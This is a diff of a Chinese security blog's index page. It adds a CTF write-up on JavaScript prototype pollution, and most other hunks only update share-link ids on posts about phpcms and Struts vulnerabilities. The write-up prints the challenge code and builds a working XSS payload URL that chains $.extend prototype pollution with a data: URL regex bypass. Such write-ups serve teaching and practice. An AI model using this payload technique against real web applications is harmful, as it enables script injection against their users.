@@ -71,6 +71,133 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-js原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/17/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
+  <time class="dt-published" datetime="2020-02-17T16:00:00.000Z" itemprop="datePublished">2020-02-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/17/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p>
+<h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p> 每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">this</span>.a=<span class="string">&quot;456&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.c=<span class="string">&quot;777&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype.b=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">Foo.prototype.c=<span class="string">&quot;789&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> foo=<span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(foo.a);<span class="comment">//456	</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.b);<span class="comment">//123</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.c);<span class="comment">//777</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>当在当前对象找不到属性或方法时便会向上(<code>__proto__</code>中)寻找</p>
+<ol>
+<li>在对象foo中寻找b</li>
+<li>如果找不到，则在<code>foo.__proto__</code>中寻找b</li>
+<li>如果仍然找不到，则继续在<code>foo.__proto__.__proto__</code>中寻找b</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
+<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
+<ol>
+<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li>JavaScript使用prototype链实现继承机制</li>
+</ol>
+<h2 id="什么时原型链污染"><a href="#什么时原型链污染" class="headerlink" title="什么时原型链污染"></a>什么时原型链污染</h2><p>当我们修改对象的<code>__proto__</code>属性时,就相当于修改对象的父类</p>
+<p>当调用不存在的方法或属性时便会在父类中寻找,就变相的控制了这个类</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>
+
+<h2 id="哪些情况原型链会被污染"><a href="#哪些情况原型链会被污染" class="headerlink" title="哪些情况原型链会被污染"></a>哪些情况原型链会被污染</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p>
+<p>指示是否深度合并</p>
+<p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p>
+<p><strong>警告:</strong> 不支持第一个参数传递 false 。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>deep</em></td>
+<td align="left">可选。 Boolean类型 指示是否深度合并对象，默认为false。如果该值为true，且多个对象的某个同名属性也都是对象，则该”属性对象”的属性也将进行合并。</td>
+</tr>
+<tr>
+<td align="left"><em>target</em></td>
+<td align="left">Object类型 目标对象，其他对象的成员属性将被附加到该对象上。</td>
+</tr>
+<tr>
+<td align="left"><em>object1</em></td>
+<td align="left">可选。 Object类型 第一个被合并的对象。</td>
+</tr>
+<tr>
+<td align="left"><em>objectN</em></td>
+<td align="left">可选。 Object类型 第N个被合并的对象。</td>
+</tr>
+</tbody></table>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目代码</p>
+<p>car.class.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">type, model, color, pic, key=<span class="string">&quot;&quot;</span></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = type</span><br><span class="line">        <span class="built_in">this</span>.model = model</span><br><span class="line">        <span class="built_in">this</span>.color = color</span><br><span class="line">        <span class="built_in">this</span>.key = key</span><br><span class="line">        <span class="built_in">this</span>.pic = pic</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> started = <span class="literal">false</span></span><br><span class="line">        <span class="built_in">this</span>.start = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            started = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.isStarted = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> started</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">powerOn</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isStarted()) &#123;</span><br><span class="line">            infobox(<span class="string">`Well Done!`</span>)</span><br><span class="line">            nextCar()</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $(<span class="string">&#x27;.chargeup&#x27;</span>)[<span class="number">0</span>].play()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">info</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        infobox(<span class="string">`This car is a <span class="subst">$&#123;<span class="built_in">this</span>.type&#125;</span> <span class="subst">$&#123;<span class="built_in">this</span>.model&#125;</span> in <span class="subst">$&#123;<span class="built_in">this</span>.color&#125;</span>. It looks very nice! But it seems to be broken ...`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">repair</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">&#x27;repair&#x27;</span>)) &#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>, <span class="built_in">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">&#x27;repair&#x27;</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">light</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        infobox(<span class="string">`You turn on the lights ... Nothing happens.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">battery</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        infobox(<span class="string">`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">ignition</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.key == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.key == <span class="string">&quot;🔑&quot;</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">            <span class="built_in">this</span>.start()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>util.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search)</span><br><span class="line"><span class="keyword">const</span> h = location.hash.slice(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">const</span> bugatti = <span class="keyword">new</span> Car(<span class="string">&#x27;Bugatti&#x27;</span>, <span class="string">&#x27;T35&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;assets/images/bugatti.png&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> porsche = <span class="keyword">new</span> Car(<span class="string">&#x27;Porsche&#x27;</span>, <span class="string">&#x27;911&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;assets/images/porsche.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line"></span><br><span class="line">porsche.repair = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">&#x27;9cdfb439c7876e703e307864c9167a15&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">&#x27;help&#x27;</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">&#x27;help&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">porsche.ignition = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    infobox(<span class="string">`Hmm ... WTF!`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [car] = cars</span><br><span class="line">    $(<span class="string">&#x27;.fa-power-off&#x27;</span>).click(<span class="function">() =&gt;</span> car.powerOn())</span><br><span class="line">    $(<span class="string">&#x27;.fa-car&#x27;</span>).click(<span class="function">() =&gt;</span> car.info())</span><br><span class="line">    $(<span class="string">&#x27;.fa-lightbulb-o&#x27;</span>).click(<span class="function">() =&gt;</span> car.light())</span><br><span class="line">    $(<span class="string">&#x27;.fa-battery-quarter&#x27;</span>).click(<span class="function">() =&gt;</span> car.battery())</span><br><span class="line">    $(<span class="string">&#x27;.fa-key&#x27;</span>).click(<span class="function">() =&gt;</span> car.ignition())</span><br><span class="line">    $(<span class="string">&#x27;.fa-wrench&#x27;</span>).click(<span class="function">() =&gt;</span> car.repair())</span><br><span class="line">    </span><br><span class="line">    $(<span class="string">&#x27;.fa-step-forward&#x27;</span>).click(<span class="function">() =&gt;</span> nextCar())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">&#x27;Bugatti&#x27;</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">&#x27;Porsche&#x27;</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nextCar = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    cars.push(cars.shift())</span><br><span class="line">    $(<span class="string">&quot;.image&quot;</span>).attr(<span class="string">&#x27;src&#x27;</span>, cars[<span class="number">0</span>].pic);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">&#x27;head&#x27;</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> infobox = <span class="function">(<span class="params">text</span>) =&gt;</span> &#123;</span><br><span class="line">    $(<span class="string">&#x27;a&#x27;</span>).css(&#123;<span class="string">&#x27;pointer-events&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;border&#x27;</span>: <span class="string">&#x27;none&#x27;</span>&#125;)</span><br><span class="line">    $(<span class="string">&#x27;.infobox&#x27;</span>).addClass(<span class="string">&#x27;infoAnimate&#x27;</span>)</span><br><span class="line">        .text(text)</span><br><span class="line">        .on(<span class="string">&#x27;animationend&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $(<span class="built_in">this</span>).removeClass(<span class="string">&#x27;infoAnimate&#x27;</span>)</span><br><span class="line">            $(<span class="string">&#x27;a&#x27;</span>).css(&#123;<span class="string">&#x27;pointer-events&#x27;</span>: <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;border&#x27;</span>: <span class="string">&#x27;solid 1px rgba(255, 255, 255, .25)&#x27;</span>&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>阅读代码发现car类的repair方法会调用</p>
+<p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))         </code></p>
+<p>可以进行原型链污染</p>
+<p>而这一题我们的目标时进行xss</p>
+<p>阅读代码发现对象<code>porsche</code>的repairWithHelper中可以进行xss</p>
+<p>而调用repairWithHelper方法就需要调用porsche的repair方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($.md5(porsche) == &#x27;9cdfb439c7876e703e307864c9167a15&#x27;)&#123;</span><br><span class="line">        if(urlParams.has(&#x27;help&#x27;)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(&#x27;help&#x27;))</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们用控制porsche.toString()==’lol’(lol的md5是9cdfb439c7876e703e307864c9167a15)，我们可以通过原型链污染来让上层为<code>[&#39;lol&#39;]</code>([‘lol’].toString()==’lol’)</p>
+<p>通过autoStart来调用bugatti.repair(原型链污染)和porsche.repair(调用repairWithHelper方法)</p>
+<p>所以构造payload:<code>http://127.0.0.1/?repair=&#123;&quot;started&quot;:true,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125; </code></p>
+<p>接下来就是利用repairWithHelper来进行xss</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">&#x27;head&#x27;</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然这里对url的域名进行了限制不能远程文件包含</p>
+<p>但是我们可以利用data协议来绕过正则从而直接执行命令</p>
+<p>data协议格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload:<code> http://127.0.0.1/?repair=&#123;&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/02/17/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="ckubfvk3f004zdcn83ifceleg" data-title="js原型链污染" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
@@ -137,7 +264,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="cku8ky3000088dnnfcjwv58cl" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="ckubfvk4h008bdcn8aepugldf" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
       
       
       
@@ -256,7 +383,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/16/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" data-id="cku8ky2zh006rdnnfc7ck54qv" data-title="vulnstackATT&amp;CK红队评估靶场1渗透记录" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/16/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" data-id="ckubfvk40006udcn826by4yhq" data-title="vulnstackATT&amp;CK红队评估靶场1渗透记录" class="article-share-link">Share</a>
       
       
       
@@ -387,7 +514,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/16/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="cku8ky2zn0078dnnfairbchxs" data-title="域渗透" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/16/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="ckubfvk47007cdcn8595qfglb" data-title="域渗透" class="article-share-link">Share</a>
       
       
       
@@ -490,7 +617,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/12/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="cku8ky2yy005ednnfh2jq98u0" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/12/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="ckubfvk3l005hdcn8fz4h0iu8" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
       
       
       
@@ -568,7 +695,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/12/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cku8ky2yz005hdnnfdeg24tda" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/12/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="ckubfvk3m005ldcn89e5k1eaa" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
       
       
       
@@ -663,7 +790,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/11/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="cku8ky2yx005adnnfcmjldssi" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/11/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ckubfvk3k005edcn8erm6f2um" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
       
       
       
@@ -719,7 +846,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="cku8ky2zz0084dnnf7jyqhhqr" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="ckubfvk4g0088dcn898lwcfq7" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
       
       
       
@@ -788,7 +915,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/09/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku8ky2x6001mdnnf22n0132y" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/02/09/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ckubfvk28001mdcn8hbm80wc2" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
       
       
       
@@ -856,72 +983,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/02/07/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cku8ky2xd001xdnnf5bpk0w9y" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
